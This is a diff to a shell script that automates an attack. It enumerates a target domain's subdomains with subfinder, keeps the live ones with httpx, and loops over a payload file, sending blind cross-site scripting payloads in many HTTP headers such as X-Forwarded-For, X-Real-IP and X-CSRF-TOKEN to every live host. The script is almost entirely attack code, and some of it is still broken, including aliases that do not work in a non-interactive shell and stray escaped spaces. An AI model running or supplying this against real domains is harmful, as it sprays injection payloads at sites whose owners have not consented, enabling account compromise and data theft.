@@ -1,45 +1,46 @@
 #!/bin/sh
 #install subfinder
 docker pull projectdiscovery/subfinder
-sleep 2
+sleep 1
 
 #alias subfinder
 alias subfinder='docker run -it --rm -w /data -v $(pwd):/data projectdiscovery/subfinder'
-sleep 2
+sleep 1
 
 #install httpx
 docker pull projectdiscovery/httpx
-sleep 2
+sleep 1
 
 #alias httpx
 alias httpx='docker run -it --rm -w /data -v $(pwd):/data projectdiscovery/httpx'
 
-sleep 2
+sleep 1
 
 echo "subfinder & httpx  successfully installs "
 
 
 #enumeration subdomain
 subfinder -d $1 -silent >> $1subdomain.txt
- sleep 2
+ sleep 1
 
-count = cat $1subdomain.txt | wc 
- echo "enumeration subdomain $count successfully  " 
-sleep 2
+wc -l <  $1subdomain.txt 
+ echo "enumeration subdomain  successfully  " 
+sleep 1
 
 #subdomain live
 
 httpx -l $1subdomain.txt >> $1LIVE.txt
 
-countx = cat $1LIVE.txt | wc 
+wc -l < $1LIVE.txt 
 
- echo " subdomainlive  $countx successfully  " 
+ echo " subdomainlive   successfully  " 
 
-sleep 2
+sleep 1
 
 #blindxss
 
 while read bxss;
-do  cat $1LIVE.txt | httpx \  -H "X-Forwarded-for: $bxss" -H "X-forwarded-ip: $bxss" -H "cf-connecting-ip: $bxss"  
-cat $1LIVE.txt | httpx \  -H "X-Client-ip: $bxss" -H "X-real-ip: $bxss" -H "X-request-uri: $bxss" \  -H "X-XSRF-TOKEN: $bxss" -H "X-CSRF-TOKEN: $bxss" 
+do  httpx -l $1LIVE.txt  -H "X-Forwarded-for: $bxss" -H "X-forwarded-ip: $bxss" -H "cf-connecting-ip: $bxss" 
+sleep 1
+httpx -l $1LIVE.txt  -H "X-Client-ip: $bxss" -H "X-real-ip: $bxss" -H "X-request-uri: $bxss" \  -H "X-XSRF-TOKEN: $bxss" -H "X-CSRF-TOKEN: $bxss" 
 done < bxss-payload.txt
